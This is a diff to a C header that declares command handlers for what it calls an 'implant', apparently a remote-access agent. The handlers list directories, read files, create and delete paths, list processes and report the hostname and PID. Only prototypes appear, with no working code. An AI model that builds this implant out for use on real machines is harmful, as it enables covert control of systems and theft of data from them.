@@ -165,3 +165,122 @@ DWORD ExecuteCommandById(
 	PBYTE* responseData,
 	DWORD* responseLen
 );
+
+/**
+ * @brief Lists the contents of a directory at the given path.
+ *
+ * @param dataLen The command argument length in bytes.
+ * @param data The command argument buffer containing a UTF-8 path.
+ * @param responseData Receives an optional heap-allocated response buffer.
+ * @param responseLen Receives the response buffer length in bytes.
+ *
+ * @return A numeric error or success code.
+ */
+DWORD CmdLs(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+);
+
+/**
+ * @brief Returns the contents of a file at the given path.
+ *
+ * @param dataLen The command argument length in bytes.
+ * @param data The command argument buffer containing a UTF-8 path.
+ * @param responseData Receives an optional heap-allocated response buffer.
+ * @param responseLen Receives the response buffer length in bytes.
+ *
+ * @return A numeric error or success code.
+ */
+DWORD CmdCat(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+);
+
+/**
+ * @brief Creates a directory at the given path.
+ *
+ * @param dataLen The command argument length in bytes.
+ * @param data The command argument buffer containing a UTF-8 path.
+ * @param responseData Receives an optional heap-allocated response buffer.
+ * @param responseLen Receives the response buffer length in bytes.
+ *
+ * @return A numeric error or success code.
+ */
+DWORD CmdMkdir(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+);
+
+/**
+ * @brief Deletes a file or directory at the given path.
+ *
+ * @param dataLen The command argument length in bytes.
+ * @param data The command argument buffer containing a UTF-8 path.
+ * @param responseData Receives an optional heap-allocated response buffer.
+ * @param responseLen Receives the response buffer length in bytes.
+ *
+ * @return A numeric error or success code.
+ */
+DWORD CmdRm(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+);
+
+/**
+ * @brief Lists all running processes with their PID and image name.
+ *
+ * @param dataLen The command argument length in bytes. Unused.
+ * @param data The command argument buffer. Unused.
+ * @param responseData Receives an optional heap-allocated response buffer.
+ * @param responseLen Receives the response buffer length in bytes.
+ *
+ * @return A numeric error or success code.
+ */
+DWORD CmdPs(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+);
+
+/**
+ * @brief Returns the NetBIOS hostname of the local machine.
+ *
+ * @param dataLen The command argument length in bytes. Unused.
+ * @param data The command argument buffer. Unused.
+ * @param responseData Receives an optional heap-allocated response buffer.
+ * @param responseLen Receives the response buffer length in bytes.
+ *
+ * @return A numeric error or success code.
+ */
+DWORD CmdHostname(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+);
+
+/**
+ * @brief Returns the process ID of the implant.
+ *
+ * @param dataLen The command argument length in bytes. Unused.
+ * @param data The command argument buffer. Unused.
+ * @param responseData Receives an optional heap-allocated response buffer.
+ * @param responseLen Receives the response buffer length in bytes.
+ *
+ * @return A numeric error or success code.
+ */
+DWORD CmdGetPid(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+);
